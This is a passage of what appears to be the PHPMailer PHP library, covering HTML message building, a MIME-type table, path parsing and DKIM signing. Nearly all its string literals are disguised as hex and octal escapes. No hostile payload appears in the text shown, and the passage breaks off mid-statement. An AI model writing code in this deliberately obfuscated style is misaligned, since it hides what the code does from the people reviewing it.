"\x20\150\x74\x74\160\x73\72\x2f\57\x67\151\x74\150\x75\142\x2e\x63\x6f\155\57\x50\x48\120\x4d\141\x69\154\145\x72\x2f\120\x48\120\115\x61\151\154\x65\162\x2f\x77\151\x6b\151\57\124\162\x6f\x75\142\x6c\145\163\x68\x6f\157\x74\x69\156\x67"; } return $this->language[$key]; } return $key; } private function getSmtpErrorMessage($base_key) { $message = $this->lang($base_key); $error = $this->smtp->getError(); if (!empty($error["\x65\162\x72\157\162"])) { $message .= "\40" . $error["\x65\162\x72\157\x72"]; if (!empty($error["\x64\145\x74\141\x69\x6c"])) { $message .= "\40" . $error["\x64\x65\164\x61\x69\x6c"]; } } return $message; } public function isError() { return $this->error_count > 0; } public function addCustomHeader($name, $value = null) { if (null === $value && strpos($name, "\x3a") !== false) { list($name, $value) = explode("\x3a", $name, 2); } $name = trim($name); $value = null === $value ? '' : trim($value); if (empty($name) || strpbrk($name . $value, "\15\xa") !== false) { if ($this->exceptions) { throw new Exception($this->lang("\x69\156\x76\141\x6c\151\x64\137\x68\145\x61\144\x65\162")); } return false; } $this->CustomHeader[] = array($name, $value); return true; } public function getCustomHeaders() { return $this->CustomHeader; } public function msgHTML($message, $basedir = '', $advanced = false) { preg_match_all("\x2f\x28\77\74\x21\55\x29\x28\x73\x72\x63\x7c\142\x61\x63\153\147\162\157\x75\156\144\51\x3d\x5b\42\x27\135\50\x2e\52\x29\x5b\42\x27\135\x2f\x55\151", $message, $images); if (array_key_exists(2, $images)) { if (strlen($basedir) > 1 && "\x2f" !== substr($basedir, -1)) { $basedir .= "\57"; } foreach ($images[2] as $imgindex => $url) { $match = array(); if (preg_match("\x23\136\144\x61\x74\x61\x3a\x28\x69\155\141\147\145\x2f\50\77\x3a\152\160\x65\77\147\x7c\x67\x69\x66\174\160\x6e\x67\51\51\73\x3f\50\142\141\x73\145\66\64\x29\77\x2c\50\56\53\x29\x23", $url, $match)) { if (count($match) === 4 && static::ENCODING_BASE64 === $match[2]) { $data = base64_decode($match[3]); } elseif ('' === $match[2]) { $data = rawurldecode($match[3]); } else { continue; } $cid = substr(hash("\163\150\141\x32\x35\x36", $data), 0, 32) . "\x40\160\x68\x70\155\x61\151\x6c\x65\x72\56\60"; if (!$this->cidExists($cid)) { $this->addStringEmbeddedImage($data, $cid, "\x65\155\142\145\x64" . $imgindex, static::ENCODING_BASE64, $match[1]); } $message = str_replace($images[0][$imgindex], $images[1][$imgindex] . "\x3d\42\x63\151\144\x3a" . $cid . "\42", $message); continue; } if (!empty($basedir) && strpos($url, "\56\56") === false && 0 !== strpos($url, "\143\x69\x64\72") && !preg_match("\x23\136\133\x61\55\172\135\133\x61\55\x7a\60\55\71\x2b\56\55\x5d\x2a\72\x3f\x2f\57\x23\x69", $url)) { $filename = static::mb_pathinfo($url, PATHINFO_BASENAME); $directory = dirname($url); if ("\56" === $directory) { $directory = ''; } $cid = substr(hash("\163\x68\141\62\65\66", $url), 0, 32) . "\x40\x70\150\x70\155\x61\x69\x6c\x65\x72\56\60"; if (strlen($basedir) > 1 && "\x2f" !== substr($basedir, -1)) { $basedir .= "\57"; } if (strlen($directory) > 1 && "\x2f" !== substr($directory, -1)) { $directory .= "\x2f"; } if ($this->addEmbeddedImage($basedir . $directory . $filename, $cid, $filename, static::ENCODING_BASE64, static::_mime_types((string) static::mb_pathinfo($filename, PATHINFO_EXTENSION)))) { $message = preg_replace("\57" . $images[1][$imgindex] . "\x3d\x5b\x22\47\x5d" . preg_quote($url, "\57") . "\x5b\x22\x27\135\x2f\x55\x69", $images[1][$imgindex] . "\x3d\x22\x63\x69\144\x3a" . $cid . "\x22", $message); } } } } $this->isHTML(); $this->Body = static::normalizeBreaks($message); $this->AltBody = static::normalizeBreaks($this->html2text($message, $advanced)); if (!$this->alternativeExists()) { $this->AltBody = "\x54\150\151\163\x20\x69\163\x20\x61\156\40\x48\124\x4d\114\55\157\156\154\171\40\x6d\145\x73\x73\x61\x67\x65\56\40\124\x6f\x20\x76\x69\x65\x77\x20\x69\164\54\x20\141\143\164\151\166\141\164\145\40\x48\x54\115\x4c\40\151\x6e\x20\171\x6f\165\162\40\145\x6d\x61\151\x6c\x20\x61\x70\x70\154\x69\143\x61\164\x69\x6f\x6e\56" . static::$LE; } return $this->Body; } public function html2text($html, $advanced = false) { if (is_callable($advanced)) { return call_user_func($advanced, $html); } return html_entity_decode(trim(strip_tags(preg_replace("\x2f\x3c\50\150\x65\x61\144\174\x74\151\x74\154\x65\174\163\164\171\154\x65\x7c\x73\x63\x72\151\x70\164\51\x5b\136\76\135\52\x3e\x2e\52\77\x3c\134\x2f\x5c\x31\x3e\x2f\163\151", '', $html))), ENT_QUOTES, $this->CharSet); } public static function _mime_types($ext = '') { $mimes = array("\170\x6c" => "\x61\x70\160\x6c\x69\x63\x61\x74\151\x6f\x6e\57\145\170\x63\x65\154", "\152\x73" => "\x61\x70\x70\154\x69\x63\x61\x74\x69\x6f\156\x2f\x6a\x61\166\x61\163\x63\162\151\x70\164", "\150\161\x78" => "\141\x70\160\x6c\x69\x63\x61\164\151\x6f\x6e\x2f\155\141\x63\55\142\151\x6e\x68\x65\170\x34\60", "\143\x70\164" => "\141\160\160\x6c\151\143\141\164\151\157\156\57\x6d\141\x63\x2d\143\x6f\155\160\x61\x63\164\x70\162\157", "\142\151\x6e" => "\141\x70\x70\x6c\151\143\x61\x74\x69\x6f\x6e\x2f\155\141\143\142\x69\156\x61\x72\x79", "\144\x6f\143" => "\x61\x70\160\x6c\151\143\x61\x74\x69\157\x6e\x2f\x6d\163\x77\x6f\x72\x64", "\167\x6f\x72\144" => "\141\160\x70\154\x69\143\x61\x74\x69\157\x6e\57\155\x73\x77\157\x72\144", "\x78\154\163\170" => "\141\x70\x70\x6c\151\x63\x61\164\151\157\156\x2f\166\156\x64\x2e\x6f\x70\145\156\x78\x6d\154\146\157\162\155\x61\164\163\55\x6f\146\146\x69\x63\145\x64\157\143\x75\x6d\145\156\x74\x2e\163\160\162\145\x61\x64\163\150\145\x65\x74\155\154\x2e\163\150\145\x65\164", "\x78\154\x74\170" => "\x61\x70\160\154\151\x63\141\164\x69\x6f\x6e\57\166\156\144\56\157\160\x65\156\170\x6d\x6c\x66\157\162\155\141\x74\163\55\157\x66\x66\x69\x63\x65\x64\157\143\165\x6d\x65\x6e\x74\56\163\x70\162\145\141\144\x73\x68\145\x65\x74\155\x6c\56\164\x65\x6d\160\x6c\141\x74\145", "\x70\x6f\164\170" => "\141\x70\160\154\x69\143\x61\164\x69\x6f\x6e\57\x76\x6e\144\x2e\x6f\160\145\156\x78\x6d\154\146\x6f\162\x6d\141\x74\163\55\157\x66\x66\x69\143\x65\144\157\x63\165\155\145\156\x74\56\x70\x72\145\x73\145\x6e\x74\141\x74\151\x6f\x6e\x6d\x6c\x2e\164\x65\x6d\160\x6c\141\x74\145", "\x70\x70\163\170" => "\x61\x70\x70\x6c\x69\143\141\164\151\x6f\156\57\166\156\144\56\157\x70\x65\x6e\x78\x6d\x6c\146\x6f\x72\x6d\141\164\x73\x2d\157\146\x66\151\143\x65\x64\157\x63\x75\155\145\156\x74\56\x70\x72\145\163\x65\x6e\164\x61\x74\x69\157\x6e\x6d\x6c\56\x73\x6c\151\144\x65\x73\150\157\x77", "\x70\160\164\170" => "\141\160\160\154\151\143\141\x74\151\x6f\156\x2f\x76\156\144\x2e\x6f\160\x65\x6e\x78\155\154\146\x6f\162\x6d\141\164\163\55\157\x66\x66\151\143\x65\x64\x6f\x63\165\x6d\x65\x6e\164\56\x70\x72\x65\163\x65\156\x74\141\x74\151\157\156\155\154\56\x70\x72\x65\163\145\x6e\x74\141\x74\151\x6f\x6e", "\163\154\x64\x78" => "\141\x70\x70\x6c\x69\x63\x61\164\x69\x6f\x6e\57\x76\x6e\144\x2e\157\x70\145\156\170\x6d\x6c\146\157\162\155\141\x74\x73\55\x6f\146\146\x69\x63\x65\144\x6f\x63\165\x6d\x65\156\164\x2e\x70\x72\145\163\145\x6e\x74\141\x74\151\x6f\x6e\155\154\x2e\163\x6c\151\144\x65", "\144\x6f\143\x78" => "\x61\x70\x70\154\x69\143\x61\x74\151\157\x6e\57\x76\156\144\56\157\160\145\156\170\x6d\154\146\x6f\x72\155\x61\164\163\x2d\x6f\146\146\x69\x63\x65\x64\157\143\x75\x6d\145\156\164\56\x77\x6f\162\x64\x70\x72\x6f\143\x65\163\x73\x69\x6e\x67\155\154\56\144\x6f\x63\x75\x6d\x65\x6e\164", "\144\x6f\164\170" => "\x61\160\x70\x6c\151\143\x61\x74\151\157\156\x2f\x76\x6e\144\56\157\160\145\156\170\155\x6c\146\x6f\x72\x6d\x61\164\163\55\157\146\x66\x69\143\x65\x64\157\143\x75\155\x65\x6e\164\x2e\167\x6f\x72\144\160\x72\157\143\145\x73\163\151\156\x67\155\x6c\x2e\x74\145\155\x70\x6c\141\164\x65", "\x78\x6c\141\x6d" => "\141\x70\x70\x6c\151\143\141\164\x69\x6f\156\57\166\156\144\x2e\155\x73\55\x65\170\x63\x65\154\x2e\x61\144\x64\x69\x6e\56\x6d\x61\x63\162\157\x45\156\x61\x62\x6c\x65\x64\x2e\x31\62", "\x78\x6c\163\142" => "\141\x70\x70\154\x69\x63\141\164\151\157\156\57\166\156\144\x2e\155\163\x2d\x65\x78\x63\145\x6c\x2e\163\x68\145\145\164\x2e\142\x69\156\x61\x72\171\56\155\141\x63\x72\157\x45\x6e\141\142\154\x65\x64\56\x31\x32", "\x63\154\141\163\163" => "\x61\x70\x70\x6c\151\x63\x61\x74\151\x6f\x6e\x2f\157\x63\164\x65\164\55\x73\164\x72\145\141\x6d", "\x64\154\154" => "\x61\x70\160\x6c\x69\143\141\x74\x69\157\156\x2f\157\143\164\x65\x74\55\x73\164\162\x65\141\x6d", "\144\155\x73" => "\141\x70\x70\x6c\151\143\x61\164\151\x6f\156\x2f\157\x63\164\145\164\x2d\163\164\x72\x65\141\155", "\145\x78\145" => "\x61\160\x70\154\x69\x63\x61\164\151\157\x6e\x2f\157\x63\164\x65\x74\55\163\164\162\x65\141\155", "\x6c\x68\141" => "\x61\160\x70\154\x69\143\x61\164\x69\x6f\156\57\x6f\x63\x74\x65\x74\x2d\x73\x74\162\x65\x61\155", "\x6c\172\150" => "\x61\x70\160\x6c\x69\143\141\164\151\157\x6e\57\x6f\143\x74\145\164\x2d\163\164\162\x65\141\x6d", "\160\x73\144" => "\141\x70\160\x6c\x69\143\x61\x74\x69\x6f\156\57\x6f\143\164\x65\164\55\x73\164\162\x65\x61\x6d", "\x73\145\141" => "\x61\x70\x70\x6c\151\x63\x61\164\151\x6f\156\x2f\157\x63\x74\x65\164\x2d\x73\x74\162\145\141\155", "\x73\157" => "\x61\x70\x70\154\151\143\141\x74\151\x6f\x6e\x2f\x6f\x63\164\145\164\x2d\x73\x74\162\145\x61\155", "\x6f\x64\x61" => "\141\160\x70\154\151\x63\x61\164\x69\157\x6e\x2f\157\x64\141", "\x70\144\146" => "\141\x70\160\x6c\x69\x63\141\164\x69\157\x6e\57\160\144\x66", "\x61\x69" => "\x61\x70\160\x6c\x69\143\x61\x74\x69\157\x6e\57\160\x6f\163\x74\x73\x63\x72\151\x70\x74", "\145\x70\163" => "\141\160\x70\x6c\151\x63\x61\x74\x69\157\x6e\x2f\160\157\x73\x74\163\143\x72\x69\x70\x74", "\160\163" => "\141\x70\160\154\x69\x63\x61\164\x69\x6f\x6e\x2f\160\x6f\x73\x74\163\143\x72\x69\160\x74", "\x73\155\x69" => "\141\x70\x70\x6c\x69\x63\141\164\x69\x6f\156\x2f\x73\x6d\151\x6c", "\x73\x6d\x69\x6c" => "\141\x70\160\x6c\151\x63\141\164\151\x6f\156\57\x73\155\x69\154", "\x6d\x69\146" => "\141\x70\160\154\x69\x63\141\x74\151\x6f\156\57\166\156\x64\x2e\x6d\151\x66", "\170\x6c\163" => "\141\x70\x70\154\151\143\x61\164\151\157\156\x2f\166\x6e\144\56\x6d\x73\x2d\x65\170\x63\x65\154", "\x70\x70\x74" => "\x61\160\x70\154\151\x63\141\164\x69\x6f\x6e\57\x76\x6e\144\x2e\x6d\163\x2d\x70\x6f\x77\x65\x72\160\157\151\156\x74", "\x77\142\170\x6d\154" => "\x61\x70\x70\154\151\x63\141\164\x69\x6f\x6e\57\x76\x6e\144\x2e\x77\141\x70\56\167\142\170\155\154", "\167\155\x6c\x63" => "\141\x70\160\x6c\x69\143\x61\164\x69\x6f\x6e\57\166\156\144\x2e\167\x61\x70\56\x77\155\x6c\x63", "\x64\143\x72" => "\x61\160\160\x6c\151\143\x61\164\151\157\156\57\170\55\x64\x69\162\x65\143\x74\157\162", "\144\151\162" => "\141\x70\x70\154\151\x63\x61\x74\151\x6f\x6e\57\170\55\144\151\x72\x65\x63\x74\x6f\162", "\x64\x78\162" => "\x61\160\x70\154\x69\x63\141\x74\x69\157\156\x2f\x78\x2d\144\x69\162\x65\x63\x74\x6f\x72", "\144\166\x69" => "\x61\x70\x70\x6c\151\x63\141\164\x69\x6f\156\x2f\x78\55\x64\166\x69", "\x67\164\x61\162" => "\141\160\160\154\151\x63\x61\164\151\x6f\156\x2f\x78\x2d\147\x74\141\162", "\160\x68\x70\x33" => "\x61\160\160\154\x69\x63\141\x74\x69\x6f\x6e\x2f\x78\x2d\x68\164\x74\160\144\x2d\160\x68\x70", "\x70\x68\x70\x34" => "\141\160\x70\x6c\x69\143\141\x74\151\x6f\x6e\x2f\170\55\x68\164\x74\x70\144\x2d\160\150\x70", "\160\x68\160" => "\141\x70\x70\x6c\x69\143\x61\164\x69\157\x6e\x2f\x78\x2d\150\164\x74\x70\144\x2d\x70\150\x70", "\160\150\x74\x6d\154" => "\141\160\160\154\151\143\x61\164\x69\x6f\156\57\x78\x2d\x68\164\164\160\x64\x2d\x70\150\x70", "\160\150\x70\163" => "\x61\160\160\x6c\151\x63\141\x74\x69\157\x6e\57\170\x2d\x68\x74\x74\160\144\x2d\160\x68\160\x2d\163\x6f\x75\162\143\x65", "\163\167\146" => "\141\160\x70\154\151\x63\141\164\x69\157\x6e\57\x78\x2d\x73\150\157\143\x6b\x77\141\166\x65\55\x66\154\x61\x73\150", "\163\x69\164" => "\141\x70\160\154\151\x63\x61\x74\151\157\156\57\x78\x2d\163\164\165\146\x66\x69\164", "\164\x61\162" => "\x61\x70\x70\154\x69\x63\141\x74\151\157\156\57\170\55\x74\x61\162", "\x74\x67\172" => "\x61\160\160\154\151\x63\141\164\x69\x6f\156\57\x78\x2d\164\x61\x72", "\x78\150\x74" => "\x61\160\160\x6c\x69\x63\141\164\x69\x6f\x6e\57\170\x68\x74\x6d\x6c\53\x78\x6d\154", "\x78\150\x74\155\x6c" => "\141\160\x70\154\151\143\x61\x74\151\157\156\57\170\150\x74\x6d\x6c\53\x78\x6d\x6c", "\x7a\x69\x70" => "\141\160\x70\x6c\151\143\141\x74\151\157\156\x2f\172\151\x70", "\x6d\x69\144" => "\x61\165\144\x69\x6f\x2f\x6d\151\x64\x69", "\155\x69\x64\x69" => "\141\165\x64\151\x6f\57\155\x69\144\x69", "\x6d\160\x32" => "\141\x75\x64\151\x6f\57\155\x70\145\147", "\x6d\x70\x33" => "\x61\x75\x64\151\x6f\x2f\x6d\160\x65\x67", "\x6d\x34\x61" => "\141\x75\x64\151\157\57\x6d\x70\x34", "\x6d\160\147\141" => "\141\165\x64\x69\x6f\57\155\x70\x65\x67", "\x61\151\146" => "\141\165\144\x69\x6f\57\170\x2d\141\x69\x66\146", "\x61\151\146\x63" => "\x61\165\x64\x69\x6f\57\170\x2d\x61\151\x66\146", "\141\x69\x66\146" => "\141\x75\x64\x69\x6f\x2f\x78\55\141\x69\146\x66", "\x72\141\155" => "\x61\165\144\151\157\x2f\170\55\160\x6e\55\x72\145\x61\x6c\x61\165\x64\151\x6f", "\162\x6d" => "\x61\165\144\151\x6f\x2f\x78\x2d\x70\x6e\x2d\162\x65\141\154\x61\x75\x64\151\x6f", "\162\160\155" => "\x61\x75\144\151\157\x2f\170\55\160\156\x2d\x72\145\x61\154\x61\165\144\151\x6f\x2d\160\154\x75\147\151\x6e", "\162\141" => "\x61\165\x64\151\x6f\57\x78\x2d\x72\x65\x61\154\x61\165\144\x69\157", "\167\141\x76" => "\141\165\x64\151\x6f\57\x78\x2d\x77\x61\166", "\x6d\153\141" => "\141\165\144\x69\x6f\57\x78\55\155\141\x74\162\157\x73\x6b\x61", "\142\x6d\160" => "\151\155\141\x67\x65\57\x62\155\160", "\147\x69\x66" => "\x69\155\141\x67\145\57\x67\x69\146", "\x6a\x70\145\147" => "\x69\x6d\141\x67\145\x2f\x6a\x70\145\x67", "\152\160\x65" => "\x69\155\x61\147\145\57\x6a\160\x65\147", "\152\x70\147" => "\151\x6d\141\147\145\x2f\x6a\x70\x65\147", "\160\x6e\x67" => "\151\155\141\147\x65\57\x70\x6e\147", "\164\x69\x66\x66" => "\x69\155\x61\147\x65\x2f\164\151\x66\146", "\x74\x69\x66" => "\151\x6d\141\x67\x65\x2f\x74\151\x66\x66", "\167\x65\142\160" => "\151\x6d\141\x67\x65\x2f\x77\145\142\160", "\x61\x76\151\146" => "\151\x6d\x61\x67\145\57\141\166\151\x66", "\x68\x65\x69\146" => "\x69\155\141\147\145\x2f\x68\x65\151\x66", "\x68\x65\x69\146\163" => "\151\x6d\141\147\145\57\150\x65\x69\x66\x2d\x73\x65\x71\165\145\156\143\x65", "\x68\145\x69\x63" => "\x69\x6d\x61\x67\145\57\x68\145\151\x63", "\x68\145\x69\143\x73" => "\x69\155\141\147\x65\57\150\x65\151\143\55\163\145\x71\165\x65\x6e\x63\x65", "\145\x6d\154" => "\x6d\145\x73\163\x61\x67\145\x2f\x72\x66\143\x38\x32\62", "\143\x73\163" => "\x74\145\170\x74\57\x63\163\163", "\150\164\x6d\154" => "\164\x65\x78\x74\x2f\150\164\155\x6c", "\150\x74\x6d" => "\x74\x65\x78\x74\x2f\150\x74\155\154", "\x73\x68\x74\x6d\x6c" => "\x74\145\170\164\x2f\x68\x74\155\154", "\x6c\157\x67" => "\x74\x65\x78\x74\57\x70\x6c\x61\151\156", "\x74\x65\170\x74" => "\164\145\170\x74\x2f\160\x6c\141\151\x6e", "\x74\x78\x74" => "\164\145\x78\x74\57\160\x6c\x61\151\156", "\x72\x74\170" => "\164\x65\170\x74\x2f\x72\151\x63\150\x74\145\x78\164", "\162\x74\146" => "\164\145\170\164\x2f\162\164\146", "\x76\x63\146" => "\164\x65\170\x74\57\x76\143\x61\162\144", "\166\x63\141\x72\144" => "\164\145\x78\164\x2f\x76\143\x61\162\144", "\151\x63\x73" => "\x74\145\x78\164\57\143\x61\x6c\x65\156\144\141\162", "\170\x6d\154" => "\x74\145\x78\164\x2f\x78\x6d\x6c", "\170\163\x6c" => "\164\x65\x78\x74\57\170\155\154", "\x63\163\166" => "\x74\x65\170\164\x2f\143\x73\166", "\x77\x6d\166" => "\x76\151\144\145\x6f\x2f\x78\x2d\155\x73\x2d\167\155\166", "\155\x70\x65\147" => "\x76\151\x64\x65\157\57\x6d\160\x65\147", "\x6d\x70\145" => "\166\151\x64\x65\x6f\x2f\155\x70\x65\x67", "\155\160\147" => "\166\x69\x64\x65\x6f\x2f\x6d\160\145\x67", "\155\160\64" => "\166\151\x64\145\x6f\57\155\160\64", "\155\64\x76" => "\166\151\144\x65\157\57\x6d\160\64", "\155\x6f\166" => "\x76\x69\144\145\x6f\57\161\x75\x69\143\153\x74\x69\x6d\x65", "\x71\x74" => "\x76\151\x64\145\157\57\161\x75\151\x63\x6b\x74\x69\155\x65", "\162\166" => "\x76\x69\x64\x65\157\x2f\166\156\144\x2e\162\156\55\162\x65\141\x6c\166\x69\144\145\x6f", "\x61\166\x69" => "\166\151\144\145\x6f\x2f\170\x2d\155\x73\166\151\144\x65\157", "\155\157\x76\x69\145" => "\166\151\144\145\157\x2f\x78\55\163\x67\151\x2d\x6d\157\166\x69\145", "\167\x65\142\155" => "\x76\151\x64\x65\157\57\x77\145\142\x6d", "\x6d\153\x76" => "\166\x69\144\145\x6f\57\170\55\155\x61\x74\x72\x6f\x73\x6b\141"); $ext = strtolower($ext); if (array_key_exists($ext, $mimes)) { return $mimes[$ext]; } return "\141\160\160\x6c\151\x63\141\164\x69\x6f\156\x2f\x6f\x63\x74\x65\164\55\163\x74\162\145\x61\x6d"; } public static function filenameToType($filename) { $qpos = strpos($filename, "\77"); if (false !== $qpos) { $filename = substr($filename, 0, $qpos); } $ext = static::mb_pathinfo($filename, PATHINFO_EXTENSION); return static::_mime_types($ext); } public static function mb_pathinfo($path, $options = null) { $ret = array("\144\151\162\156\x61\x6d\x65" => '', "\x62\x61\163\145\x6e\141\x6d\145" => '', "\x65\x78\164\145\x6e\163\151\157\x6e" => '', "\146\x69\x6c\x65\x6e\x61\x6d\x65" => ''); $pathinfo = array(); if (preg_match("\43\x5e\50\x2e\x2a\x3f\x29\x5b\134\x5c\57\x5d\x2a\50\x28\x5b\136\57\x5c\x5c\135\52\77\x29\x28\134\56\50\x5b\136\x2e\x5c\134\57\135\53\77\x29\x7c\x29\51\x5b\134\x5c\57\x2e\135\52\44\43\155", $path, $pathinfo)) { if (array_key_exists(1, $pathinfo)) { $ret["\144\x69\162\156\x61\155\x65"] = $pathinfo[1]; } if (array_key_exists(2, $pathinfo)) { $ret["\142\141\163\x65\156\141\155\145"] = $pathinfo[2]; } if (array_key_exists(5, $pathinfo)) { $ret["\x65\x78\x74\x65\156\163\151\157\156"] = $pathinfo[5]; } if (array_key_exists(3, $pathinfo)) { $ret["\146\x69\154\x65\156\x61\x6d\145"] = $pathinfo[3]; } } switch ($options) { case PATHINFO_DIRNAME: case "\144\151\x72\x6e\x61\155\145": return $ret["\x64\x69\x72\156\x61\x6d\x65"]; case PATHINFO_BASENAME: case "\x62\141\163\x65\156\141\155\145": return $ret["\x62\141\x73\x65\x6e\x61\x6d\145"]; case PATHINFO_EXTENSION: case "\x65\170\164\x65\x6e\163\x69\x6f\156": return $ret["\145\170\x74\145\x6e\x73\x69\x6f\x6e"]; case PATHINFO_FILENAME: case "\x66\151\x6c\145\156\x61\x6d\x65": return $ret["\146\151\154\145\x6e\x61\x6d\x65"]; default: return $ret; } } public function set($name, $value = '') { if (property_exists($this, $name)) { $this->{$name} = $value; return true; } $this->setError($this->lang("\166\141\x72\151\x61\x62\154\x65\137\163\x65\164") . $name); return false; } public function secureHeader($str) { return trim(str_replace(array("\15", "\xa"), '', $str)); } public static function normalizeBreaks($text, $breaktype = null) { if (null === $breaktype) { $breaktype = static::$LE; } $text = str_replace(array(self::CRLF, "\15"), "\12", $text); if ("\12" !== $breaktype) { $text = str_replace("\xa", $breaktype, $text); } return $text; } public static function stripTrailingWSP($text) { return rtrim($text, "\x20\xd\12\11"); } public static function stripTrailingBreaks($text) { return rtrim($text, "\xd\12"); } public static function getLE() { return static::$LE; } protected static function setLE($le) { static::$LE = $le; } public function sign($cert_filename, $key_filename, $key_pass, $extracerts_filename = '') { $this->sign_cert_file = $cert_filename; $this->sign_key_file = $key_filename; $this->sign_key_pass = $key_pass; $this->sign_extracerts_file = $extracerts_filename; } public function DKIM_QP($txt) { $line = ''; $len = strlen($txt); for ($i = 0; $i < $len; ++$i) { $ord = ord($txt[$i]); if (33 <= $ord && $ord <= 58 || $ord === 60 || 62 <= $ord && $ord <= 126) { $line .= $txt[$i]; } else { $line .= "\x3d" . sprintf("\x25\60\62\130", $ord); } } return $line; } public function DKIM_Sign($signHeader) { if (!defined("\x50\113\103\x53\67\137\124\105\x58\x54")) { if ($this->exceptions) { throw new Exception($this->lang("\x65\170\x74\145\x6e\x73\x69\x6f\x6e\x5f\x6d\151\x73\163\x69\156\x67") . "\x6f\160\x65\x6e\x73\163\154"); } return ''; } $privKeyStr = !empty($this->DKIM_private_string) ? $this->DKIM_private_string : file_get_contents($this->DKIM_private); if ('' !== $this->DKIM_passphrase) { $privKey = openssl_pkey_get_private($privKeyStr, $this->DKIM_passphrase); } else { $privKey = openssl_pkey_get_private($privKeyStr); } if (openssl_sign($signHeader, $signature, $privKey, "\163\150\x61\x32\65\x36\127\151\164\x68\x52\123\101\x45\156\x63\162\171\160\x74\x69\x6f\x6e")) { if (\PHP_MAJOR_VERSION < 8) { openssl_pkey_free($privKey); } return base64_encode($signature); } if (\PHP_MAJOR_VERSION < 8) { openssl_pkey_free($privKey); } return ''; } public function DKIM_HeaderC($signHeader) { $signHeader = static::normalizeBreaks($signHeader, self::CRLF); $signHeader = preg_replace("\x2f\x5c\x72\134\156\x5b\40\134\164\135\x2b\57", "\40", $signHeader); $lines = explode(self::CRLF, $signHeader); foreach ($lines as $key => $line) { if (strpos($line, "\x3a") === false) { continue; } list($heading, $value) = explode("\x3a", $line, 2); $heading = strtolower($heading); $value = preg_replace("\x2f\x5b\x20\134\x74\135\53\57", "\40", $value); $lines[$key] = trim($heading, "\40\x9") . "\72" . trim($value, "\x20\11"); } return implode(self::CRLF, $lines); } public function DKIM_BodyC($body) { if (empty($body)) { return self::CRLF; } $body = static::normalizeBreaks($body, self::CRLF); return static::stripTrailingBreaks($body) . self::CRLF; } public function DKIM_Add($headers_line, $subject, $body) { $DKIMsignatureType = "\162\163\141\x2d\163\150\141\x32\65\66"; $DKIMcanonicalization = "\x72\x65\154\141\170\x65\x64\57\x73\151\x6d\x70\154\145"; $DKIMquery = "\x64\156\163\57\x74\x78\x74"; $DKIMtime = time(); $autoSignHeaders = array("\146\x72\x6f\x6d", "\164\157", "\x63\143", "\x64\x61\164\145", "\163\165\x62\152\145\143\x74", "\162\x65\x70\x6c\171\55\164\x6f", "\x6d\x65\163\x73\x61\x67\x65\55\x69\144", "\x63\157\156\164\x65\x6e\x74\x2d\164\x79\x70\x65", "\155\151\x6d\x65\x2d\166\x65\x72\x73\x69\x6f\x6e", "\x78\55\155\x61\151\154\x65\x72"); if (stripos($headers_line, "\123\165\142\152\x65\143\x74") === false) { $headers_line .= "\123\x75\142\x6a\145\143\164\72\40" . $subject . static::$LE; } $headerLines = explode(static::$LE, $headers_line); $currentHeaderLabel = ''; $currentHeaderValue = ''; $parsedHeaders = array(); $headerLineIndex = 0; $headerLineCount = count($headerLines); foreach ($headerLines as $headerLine) { $matches = array(); if (preg_match("\x2f\136\50\133\x5e\x20\134\x74\x5d\x2a\x3f\51\x28\77\72\72\133\x20\x5c\x74\135\52\51\50\x2e\x2a\51\44\57", $headerLine, $matches)) { if ($currentHeaderLabel !== '') { $parsedHeaders[] = array("\x6c\x61\142\145\154" => $currentHeaderLabel, "\166\x61\x6c\165\x65" => $currentHeaderValue); } $currentHeaderLabel = $matches[1]; $currentHeaderValue = $matches[2]; } elseif (preg_match("\x2f\136\133\x20\134\x74\x5d\53\x28\56\x2a\51\x24\57", $headerLine, $matches)) { $currentHeaderValue .= "\x20" . $matches[1]; } ++$headerLineIndex; if ($headerLineIndex >= $headerLineCount) { $parsedHeaders[] = array("\x6c\x61\x62\x65\154" => $currentHeaderLabel, "\166\141\x6c\165\x65" => $currentHeaderValue); } } $copiedHeaders = array(); $headersToSignKeys = array(); $headersToSign = array(); foreach ($parsedHeaders as $header) { if (in_array(strtolower($header["\154\141\142\145\154"]), $autoSignHeaders, true)) { $headersToSignKeys[] = $header["\154\x61\x62\x65\x6c"]; $headersToSign[] = $header["\154\x61\142\x65\x6c"] . "\x3a\40" . $header["\166\x61\x6c\165\145"]; if ($this->DKIM_copyHeaderFields) { $copiedHeaders[] = $header["\x6c\x61\142\145\x6c"] . "\72" . str_replace("\x7c", "\x3d\x37\x43", $this->DKIM_QP($header["\166\141\154\165\x65"])); } continue; } if (in_array($header["\154\141\142\x65\x6c"], $this->DKIM_extraHeaders, true)) { foreach ($this->CustomHeader as $customHeader) { if ($customHeader[0] === $header["\154\141\x62\x65\x6c"]) { $headersToSignKeys[] = $header["\154\141\x62\145\x6c"]; $headersToSign[] = $header["\x6c\141\142\x65\x6c"] . "\x3a\40" . $header["\x76\x61\154\x75\145"]; if ($this->DKIM_copyHeaderFields) { $copiedHeaders[] = $header["\x6c\x61\142\x65\x6c"] . "\x3a" . str_replace("\174", "\75\x37\103", $this->DKIM_QP($header["\166\x61\154\x75\x65"])); } continue 2; } } } } $copiedHeaderFields = ''; if ($this->DKIM_copyHeaderFields && count($copiedHeaders) > 0) { $copiedHeaderFields = "\40\x7a\x3d"; $first = true; foreach ($copiedHeaders as $copiedHeader) { if (!$first) { $copiedHeaderFields .= static::$LE . "\40\x7c"; } if (strlen($copiedHeader) > self::STD_LINE_LENGTH - 3) { $copiedHeaderFields .= substr(chunk_split($copiedHeader, self::STD_LINE_LENGTH - 3, static::$LE . self::FWS), 0, -strlen(static::$LE . self::FWS)); } else { $copiedHeaderFields .= $copiedHeader; } $first = false; } $copiedHeaderFields .= "\73" . static::$LE; } $headerKeys = "\40\150\75" . implode("\x3a", $headersToSignKeys) . "\73" . static::$LE; $headerValues = implode(static::$LE, $headersToSign); $body = $this->DKIM_BodyC($body); $DKIMb64 = base64_encode(pack("\110\52", hash("\x73\150\x61\x32\x35\x36", $body))); $ident = ''; if ('' !== $this->DKIM_identity) { $ident = "\x20\x69\75" . $this->DKIM_identity . "\73" . static::$LE; } $dkimSignatureHeader = "\104\x4b\111\x4d\55\x53\151\x67\156\141\164\165\x72\145\72\40\x76\x3d\61\73" . "\x20\x64\75" . $this->DKIM_domain . "\x3b" . "\40\163\x3d" . $this->DKIM_selector . "\73" . static::$LE . "\40\x61\x3d" . $DKIMsignatureType . "\73" . "\x20\x71\x3d" . $DKIMquery . "\73" . "\40\x74\75" . $DKIMtime . "\73" . "\40\x63\x3d" . $DKIMcanonicalization . "\73" . static::$LE . $headerKeys . $ident . $copiedHeaderFields . "\40\142\150\75" . 